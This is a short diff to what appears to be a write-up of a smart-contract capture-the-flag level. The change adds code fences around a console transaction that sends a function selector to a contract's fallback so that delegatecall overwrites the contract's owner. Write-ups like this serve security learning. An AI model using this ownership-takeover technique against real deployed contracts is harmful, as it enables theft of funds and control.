@@ -15,11 +15,13 @@ In the web console:
 Though we only want the first 4 bytes = 0xdd365b8b
 
 Then send a transaction to the fallback function of the contract passing the player account, contract address and the 4 bytes of the sha3 hash of the function:
+```solidity
     sendTransaction({
         from: player,
         to: contract.address,
         data: "0xdd365b8b"
     })
+```
 
 This will overwrite the owner variable of the Delegation contract:
 - contract.owner()
